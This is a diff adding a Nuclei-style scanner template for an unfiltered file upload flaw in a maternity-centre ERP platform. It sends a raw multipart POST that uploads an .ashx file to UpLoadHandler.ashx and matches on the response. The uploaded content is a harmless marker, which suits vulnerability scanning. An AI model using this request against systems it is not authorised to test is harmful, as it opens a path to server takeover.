@@ -1,0 +1,33 @@
+id: yzhs-erp-UpLoadHandler-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/Y11-3%E6%9C%88%E5%AD%90%E4%BC%9A-ERP%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=y11-3%e6%9c%88%e5%ad%90%e4%bc%9a-erp%e7%ae%a1%e7%90%86%e4%ba%91%e5%b9%b3%e5%8f%b0-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"  
+http:
+  - raw:
+      - |
+        POST /Page/BasicInfo/ashx/UpLoadHandler.ashx HTTP/1.1
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        User-Agent: Java/1.8.0_301
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 123
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.ashx"
+
+        12345
+        --00content0boundary00--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.ashx'
+#http://xx.xx.xx.xx/UploadBaseFolder/ERP/202308/1_230828092026228129.ashx
